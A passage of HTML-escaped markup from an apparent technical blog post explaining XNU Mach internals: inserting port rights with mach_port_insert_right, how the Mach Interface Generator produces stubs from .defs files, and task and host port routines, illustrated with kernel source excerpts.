    &lt;span class=&quot;mi&quot;&gt;1005&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;notify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1006&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If you have a send right to a port, you can insert that send right into another task using &lt;strong&gt;mach_port_insert_right&lt;/strong&gt; and then sending the message using &lt;strong&gt;mach_msg&lt;/strong&gt;. As discussed before, &lt;strong&gt;mach_port_name_t&lt;/strong&gt; is meanigless outside a task’s namespace, this is why the task (ipc_space_t) needs to be specified along with the &lt;strong&gt;mach_port_name_t&lt;/strong&gt; so that the kernel can put the specified name (mach_port_name_t) into that task’s namespace.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;cm&quot;&gt;/*
     *	Inserts the specified rights into the target task,
     *	using the specified name.  If inserting send/receive
     *	rights and the task already has send/receive rights
     *	for the port, then the names must agree.In any case,
     *	the task gains a user ref for the port.
     */&lt;/span&gt;

    &lt;span class=&quot;cp&quot;&gt;#ifdef	mig_external
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;mig_external&lt;/span&gt;
    &lt;span class=&quot;cp&quot;&gt;#else
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt;
    &lt;span class=&quot;cp&quot;&gt;#endif	&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* mig_external */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mach_port_insert_right&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;ipc_space_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;poly&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_msg_type_name_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;polyPoly&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_port_insert_right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;receiver_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_MOVE_SEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;mig---mach-interface-generator&quot;&gt;MIG - Mach Interface Generator&lt;/h2&gt;

&lt;p&gt;A lot of the code written using Mach APIs involves the same boilerplate code, doing which many times might cause complications and even lead to security flaws, and this is where the Mach Interface Generator comes in very handy. It implements a stub function based on a MIG specification file (defs). The client can call this stub function just like any other C function call, and the stub function handles marshaling and un-marshaling data in and out of the mach messages, thereby controlling all the Mach IPC implementation happening underneath.&lt;/p&gt;

&lt;p&gt;MIG’s specification files have the extension &lt;strong&gt;defs&lt;/strong&gt;, and when the kernel is compiled, these files get processed by mig and result in addition of extra files, which contains the autogenerated MIG wrappers. For e.g, let’s have a look at the task.defs file in &lt;strong&gt;osfmk/mach/task.defs&lt;/strong&gt;. As you can see, each defs file has a subsystem name followed by an arbitrary number, which is declared at the very beginning of the file. In this case, the subsystem name is task and is the number is 3400. The stub function may also check the validity of the arguments that are passed to it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;COMPILE_KERNEL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xnu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4570&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;defs&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subsystem&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERNEL_SERVER&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;67&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;KernelServer&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* KERNEL_SERVER */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;71&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;include&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;include&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;include&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;75&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    76:  *  Create a new task with an empty set of IPC rights,
    77:  *  and having an address space constructed from the
    78:  *  target task (or empty, if inherit_memory is FALSE).
    79:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routine&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;81&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;target_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;82&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;ledgers&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ledger_array_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;inherit_memory&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;boolean_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;child_task&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/*&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;Destroy&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;causing&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;its&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threads&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If you want to generate the MIG wrappers, you can simple run mig on any def file from a clean directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;During compilation, the &lt;strong&gt;mig&lt;/strong&gt; tool creates three files based on the subsystem name. For e.g, for the task subsystem, the following files are created&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;taskUser.c&lt;/strong&gt; - This file contains the implementations for the proxy functions which is responsible for marshalling the data into a message and sending it. It is also responsible for unmarshalling the returned data and getting it sent back to the client.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;task.c&lt;/strong&gt; - Prototype for the proxy functions&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;taskServer.c&lt;/strong&gt; - Implementations for the stub functions are contained in this file.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There are many &lt;strong&gt;routines&lt;/strong&gt; defined in the generated file and these are basically the functions. Let’s look at one specific Mach API &lt;strong&gt;routine task_set_exception_ports&lt;/strong&gt; and have a look at the auto-generated MIG code.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;COMPILE_KERNEL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xnu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4903&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;221&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUILD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RELEASE_X86_64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RELEASE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1697&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Routine task_set_exception_ports */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1698&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mig_internal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;novalue&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_Xtask_set_exception_ports&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1699&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InHeadP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OutHeadP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1700&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1701&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1702&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifdef&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;__MigPackStructs&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1703&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1704&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1705&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1706&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1707&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;cm&quot;&gt;/* start of the kernel processed data */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1708&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;mach_msg_body_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msgh_body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1709&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;mach_msg_port_descriptor_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1710&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;cm&quot;&gt;/* end of the kernel processed data */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1711&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;NDR_record_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1712&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;exception_mask_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exception_mask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1713&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;exception_behavior_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;behavior&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1714&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;thread_state_flavor_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_flavor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1715&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;mach_msg_trailer_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1716&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unused&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1717&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifdef&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;__MigPackStructs&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1718&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1719&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1720&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__Request__task_set_exception_ports_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1721&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__Reply__task_set_exception_ports_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Reply&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unused&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1722&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It’s quite important to audit the code in these functions as well. In the next article, we will discuss a vulnerability identified in the autogenerated MIG code obtained after building the kernel.&lt;/p&gt;

&lt;h2 id=&quot;task-ports&quot;&gt;Task Ports&lt;/h2&gt;

&lt;p&gt;One of the other useful features of Mach Ports is that they serve as an abstraction over Objects, and the abstraction is provided by Mach Messages which mostly translate over MIG. For example, the Host Mach ports provide many APIs to get information about the host. The &lt;strong&gt;host_kernel_version()&lt;/strong&gt; function will print out the kernel version. This is the same API used by the &lt;strong&gt;uname -r&lt;/strong&gt; command. Looking at the file &lt;strong&gt;osfmk/mach/mach_host.defs&lt;/strong&gt; will show all the routines provided by the host port APIs.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;defs&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;087&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    088:  *	Return information about this host.
    089:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;090&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routine&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;091&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;092&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;flavor&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_flavor_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;093&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;host_info_out&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_info_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CountInOut&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;094&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;095&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    096:  *	Get string describing current kernel version.
    097:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;098&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routine&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;host_kernel_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;099&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;kernel_version&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_version_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;101&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;102&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    103:  *      Get host page size
    104:  *	(compatibility for running old libraries on new kernels -
    105:  *	host_page_size() is now a library routine based on constants)
    106:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;107&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERNEL&lt;/span&gt;
